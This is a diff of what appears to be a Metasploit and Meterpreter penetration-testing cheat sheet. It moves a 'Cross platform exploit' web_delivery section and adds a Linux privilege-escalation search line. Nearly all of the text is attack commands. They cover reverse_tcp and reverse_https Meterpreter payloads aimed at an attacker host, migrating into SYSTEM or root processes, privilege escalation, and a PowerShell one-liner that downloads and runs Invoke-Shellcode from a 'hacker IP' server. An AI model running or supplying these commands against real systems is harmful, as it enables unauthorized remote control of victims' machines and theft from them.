@@ -166,26 +166,6 @@ webcam_list                                   Show currently available web cams
 webcam_snap                                   Takes a picture from the web cam
 ------------------------------------------------------------------------------------------------------
 
-# Cross platform exploit
-
-- Windows
-use exploit/multi/script/web_delivery
-set lhost <attacker IP>
-set lport <attacker port>
-show targets
-set target 2                                  Set the target language to PowerShell
-set payload windows/meterpreter/reverse_tcp
-exploit
-
-- Linux and OS X
-use exploit/multi/script/web_delivery
-set lhost <attacker IP>
-set lport <attacker port>
-set target 0                                  Set the target language to Python
-set payload python/meterpreter/reverse_tcp
-exploit
-------------------------------------------------------------------------------------------------------
-
 # Sessions
 
 sessions -h                                   Show help on the sessions command
@@ -200,14 +180,14 @@ Many options allow specifying session ranges using commas and dashes. For exampl
 
 # Post exploitation - host situational awareness
 
-ps                                            Search for a process running as NT AUTHORITY\SYSTEM
-migrate <PID>                                 Migrate to a process running as NT AUTHORITY\SYSTEM
-sysinfo                                       Gets information about the remote system, such as OS
 getuid                                        Get the user that the server is running as
+sysinfo                                       Gets information about the remote system, such as OS
+ps                                            Search for a process running as NT AUTHORITY\SYSTEM or root (*nix)
+migrate <PID>                                 Migrate to a process running as NT AUTHORITY\SYSTEM or root (*nix)
 ipconfig                                      Show the target IP
 ------------------------------------------------------------------------------------------------------
 
-# Escalate privileges
+# Escalate privileges - Windows
 
 use priv                                      Attempt to elevate to NT AUTHORITY\SYSTEM
 background                                    If this fails, background the current session and try options
@@ -276,6 +256,9 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST <attacker IP>
 set LPORT 444
 exploit
+
+- Linux
+searchsploit 'privilege escalation' | grep <Linux distro>
 ------------------------------------------------------------------------------------------------------
 
 # Dump hashes
@@ -424,7 +407,7 @@ set LHOST <local IP>
 set LPORT <local port>
 exploit
 
-powershell -command "IEX (New-Object Net.WebClient).DownloadString('http://AWS-IP/Powersploit/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -lhost <local IP> -lport <local port> -Force"
+powershell -command "IEX (New-Object Net.WebClient).DownloadString('http://hacker IP/Powersploit/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -lhost <local IP> -lport <local port> -Force"
 ------------------------------------------------------------------------------------------------------
 
 # Pivoting
@@ -452,6 +435,26 @@ set RHOSTS 10.0.0.0/24
 set PORTS 445
 set THREADS 10
 run
+------------------------------------------------------------------------------------------------------
+
+# Cross platform exploit
+
+- Windows
+use exploit/multi/script/web_delivery
+set lhost <attacker IP>
+set lport <attacker port>
+show targets
+set target 2                                  Set the target language to PowerShell
+set payload windows/meterpreter/reverse_tcp
+exploit
+
+- Linux and OS X
+use exploit/multi/script/web_delivery
+set lhost <attacker IP>
+set lport <attacker port>
+set target 0                                  Set the target language to Python
+set payload python/meterpreter/reverse_tcp
+exploit
 ------------------------------------------------------------------------------------------------------
 
 # Post exploitation of a domain controller (DC)
